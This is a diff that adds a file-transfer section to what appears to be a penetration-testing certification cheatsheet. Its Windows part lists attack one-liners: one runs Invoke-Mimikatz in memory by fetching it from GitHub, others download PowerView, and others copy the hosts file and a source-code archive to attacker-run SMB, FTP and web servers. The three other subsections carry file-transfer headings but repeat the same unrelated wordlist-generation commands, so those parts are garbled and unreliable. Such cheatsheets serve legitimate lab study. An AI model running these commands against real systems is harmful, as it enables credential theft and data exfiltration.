@@ -25,6 +25,11 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [MSSQL](#mssql)
     - [IPMI](#ipmi)
     - [Remote Management](#linux-remote-management-ssh)
+- [File Transfers](#file-transfers)
+    - [Windows File Transfer Methods](#windows-file-transfer-methods)
+    - [Linux File Transfer Methods](#linux-file-transfer-methods)
+    - [Transferring Files with Code](#transferring-files-with-code)
+    - [Miscellaneous File Transfer Methods](#miscellaneous-file-transfer-methods)
 - [Password Attacks](#password-attacks)
     - [Password Mutations](#password-mutations)
     - [Remote Password Attacks](#remote-password-attacks)
@@ -329,6 +334,85 @@ sqlplus <user>/<pass>@<FQDN/IP>/<db>
 
 # Upload a file with Oracle RDBMS.
 ./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt
+```
+## File Transfers
+
+##### Windows File Transfer Methods
+```
+# Download a file with PowerShell with Synchronous 
+(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+
+# Download a file with PowerShell with Asynchronous 
+(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
+
+# Execute a file in memory using PowerShell
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+
+# Execute a file in memory using PowerShell
+(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+
+# Download a file with PowerShell
+Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+
+# Download a file via smbshare
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+
+net use n: \\192.168.220.133\share /user:test test
+
+# Download a file via FTP 
+sudo python3 -m pyftpdlib --port 21
+
+(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+
+# Upload a file via WebServer 
+pip3 install uploadserver
+python3 -m uploadserver
+
+Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+
+# Upload a file via smbshare 
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\share\
+
+# Upload a file via FTP  
+sudo python3 -m pyftpdlib --port 21 --write
+
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+
+```
+##### Linux File Transfer Methods
+```
+# Uses cewl to generate a wordlist based on keywords present on a website.
+cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
+
+# Uses Hashcat to generate a rule-based word list.
+hashcat --force password.list -r custom.rule --stdout > mut_password.list
+
+# Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.
+./username-anarchy -i /path/to/listoffirstandlastnames.txt
+```
+##### Transferring Files with Code
+```
+# Uses cewl to generate a wordlist based on keywords present on a website.
+cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
+
+# Uses Hashcat to generate a rule-based word list.
+hashcat --force password.list -r custom.rule --stdout > mut_password.list
+
+# Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.
+./username-anarchy -i /path/to/listoffirstandlastnames.txt
+```
+##### Miscellaneous File Transfer Methods
+```
+# Uses cewl to generate a wordlist based on keywords present on a website.
+cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
+
+# Uses Hashcat to generate a rule-based word list.
+hashcat --force password.list -r custom.rule --stdout > mut_password.list
+
+# Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.
+./username-anarchy -i /path/to/listoffirstandlastnames.txt
 ```
 ## Password Attacks
 
